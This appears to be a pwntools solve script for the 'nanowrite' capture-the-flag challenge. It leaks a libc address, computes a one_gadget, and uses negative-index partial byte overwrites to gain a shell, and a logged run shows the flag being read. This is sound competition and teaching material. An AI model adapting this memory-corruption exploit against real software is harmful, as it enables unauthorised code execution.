from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./nanowrite"
elf = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "dorsia4.wpictf.xyz"
  PORT = 31337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

r = s.recvuntil(" ")[:-1]
libc_leak = int(r, 16)
libc_base = libc_leak - 0x10a38c
gadget_offset = [0x4f2c5, 0x4f322, 0x10a38c]
one_gadget = libc_base + gadget_offset[1]

print "libc_leak  =", hex(libc_leak)
print "libc_base  =", hex(libc_base)
print "one_gadget =", hex(one_gadget)

s.sendline("-103 " + hex(((libc_base>>8)&0xff)-0x40+0x91)[2:])
s.sendline("-102 " + hex(((libc_base>>16)&0xff)-0x9e+0xb0)[2:])
s.sendline("-103 " + hex(((libc_base>>8)&0xff)-0x40+0x38)[2:])
s.sendline("-104 " + "22")
s.sendline("-102 " + hex(((libc_base>>16)&0xff)-0x9e+0xb7)[2:])
s.sendline("-103 " + hex(((libc_base>>8)&0xff)-0x40+0x33)[2:])
s.sendline("-102 " + hex(((libc_base>>16)&0xff)-0x9e+0xa3)[2:])

s.interactive()

'''
$ python exploit.py r
[+] Opening connection to dorsia4.wpictf.xyz on port 31337: Done
libc_leak  = 0x7824c97d438c
libc_base  = 0x7824c96ca000
one_gadget = 0x7824c9719322
[*] Switching to interactive mode
giv i b
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
flag.txt
nanowrite
run_problem.sh
$ cat flag.txt
WPI{D0_you_like_Hu3y_Lew1s_&_the_News?}
'''
